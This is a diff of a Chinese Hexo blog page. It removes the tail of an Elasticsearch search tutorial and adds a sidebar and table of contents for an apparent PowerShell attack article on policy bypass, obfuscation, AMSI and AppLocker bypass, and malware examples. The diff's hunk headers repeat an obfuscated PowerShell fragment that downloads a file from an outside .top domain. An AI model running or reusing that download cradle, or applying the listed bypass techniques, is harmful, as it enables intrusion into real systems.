-<h4 id="高亮搜索"><a href="#高亮搜索" class="headerlink" title="高亮搜索"></a>高亮搜索</h4><p>让我们在之前的语句上增加<code>highlight</code>参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot; : &#123;</span><br><span class="line">        &quot;match_phrase&quot; : &#123;</span><br><span class="line">            &quot;about&quot; : &quot;rock climbing&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;highlight&quot;: &#123;</span><br><span class="line">        &quot;fields&quot; : &#123;</span><br><span class="line">            &quot;about&quot; : &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h3 id="聚合"><a href="#聚合" class="headerlink" title="聚合"></a>聚合</h3><p>允许在复杂的数据上生成统计。<br>例：找到所有职员中最大的共同点（兴趣爱好）是什么：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;all_interests&quot;: &#123;</span><br><span class="line">      &quot;terms&quot;: &#123; &quot;field&quot;: &quot;interests&quot; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>所有姓”Smith”的人最大的共同点（兴趣爱好），我们只需要增加合适的语句既可：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;match&quot;: &#123;</span><br><span class="line">      &quot;last_name&quot;: &quot;smith&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;all_interests&quot;: &#123;</span><br><span class="line">      &quot;terms&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: &quot;interests&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>聚合也允许分级汇总。例如，让我们统计每种兴趣下职员的平均年龄：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;aggs&quot; : &#123;</span><br><span class="line">        &quot;all_interests&quot; : &#123;</span><br><span class="line">            &quot;terms&quot; : &#123; &quot;field&quot; : &quot;interests&quot; &#125;,</span><br><span class="line">            &quot;aggs&quot; : &#123;</span><br><span class="line">                &quot;avg_age&quot; : &#123;</span><br><span class="line">                    &quot;avg&quot; : &#123; &quot;field&quot; : &quot;age&quot; &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p><em>注：所有例子来自Elasticsearch权威指南</em><br><a href="https://es.xiaoleilu.com/010_Intro/30_Tutorial_Search.html" target="_blank" rel="noopener">参考：Elasticsearch权威指南中文版</a><br><a href="https://blog.csdn.net/zhongzunfa/article/details/81147906" target="_blank" rel="noopener">错误解决参考</a></p>
-
-          
-        
+    <div class="post-spread">
       
     </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
   </div>
-  
-  
-  
-  </article>
-
-
-    
-  </section>
-
-  
 
 
           </div>
@@ -733,6 +480,15 @@ Ne^T^.^w^eB^cLie^n^T^).^Do^W^nlo^aDfi^Le(^’http://www. [REMOVED].top/user.php?
 
 
           
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80Mjc3My8xOTMyMA=="></div>
+    </div>
+
+  
+
+
 
         </div>
         
@@ -753,8 +509,17 @@ Ne^T^.^w^eB^cLie^n^T^).^Do^W^nlo^aDfi^Le(^’http://www. [REMOVED].top/user.php?
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -828,6 +593,22 @@ Ne^T^.^w^eB^cLie^n^T^).^Do^W^nlo^aDfi^Le(^’http://www. [REMOVED].top/user.php?
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#主要讨论"><span class="nav-number">1.</span> <span class="nav-text">主要讨论</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#脚本执行策略"><span class="nav-number">2.</span> <span class="nav-text">脚本执行策略</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#策略的绕过"><span class="nav-number">2.1.</span> <span class="nav-text">策略的绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用参数"><span class="nav-number">3.</span> <span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用函数"><span class="nav-number">4.</span> <span class="nav-text">常用函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#powershell攻击中常用命令"><span class="nav-number">5.</span> <span class="nav-text">powershell攻击中常用命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用横向移动方法"><span class="nav-number">6.</span> <span class="nav-text">常用横向移动方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#权限维持"><span class="nav-number">6.1.</span> <span class="nav-text">权限维持</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#代码混淆"><span class="nav-number">7.</span> <span class="nav-text">代码混淆</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#常用方法和例子"><span class="nav-number">7.1.</span> <span class="nav-text">常用方法和例子</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#常用混淆工具"><span class="nav-number">7.2.</span> <span class="nav-text">常用混淆工具</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#powershell-exe黑名单绕过"><span class="nav-number">8.</span> <span class="nav-text">powershell.exe黑名单绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#恶意软件中常用例子"><span class="nav-number">9.</span> <span class="nav-text">恶意软件中常用例子</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#TROJANS-后门"><span class="nav-number">9.1.</span> <span class="nav-text">TROJANS 后门</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用工具"><span class="nav-number">10.</span> <span class="nav-text">常用工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御方法"><span class="nav-number">11.</span> <span class="nav-text">防御方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AMIS"><span class="nav-number">12.</span> <span class="nav-text">AMIS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#定义"><span class="nav-number">12.1.</span> <span class="nav-text">定义</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过"><span class="nav-number">12.2.</span> <span class="nav-text">绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AppLocker"><span class="nav-number">13.</span> <span class="nav-text">AppLocker</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过-1"><span class="nav-number">13.1.</span> <span class="nav-text">绕过</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -972,6 +753,10 @@ Ne^T^.^w^eB^cLie^n^T^).^Do^W^nlo^aDfi^Le(^’http://www. [REMOVED].top/user.php?
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -1000,6 +785,17 @@ Ne^T^.^w^eB^cLie^n^T^).^Do^W^nlo^aDfi^Le(^’http://www. [REMOVED].top/user.php?
 
 
 
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
   
 
 
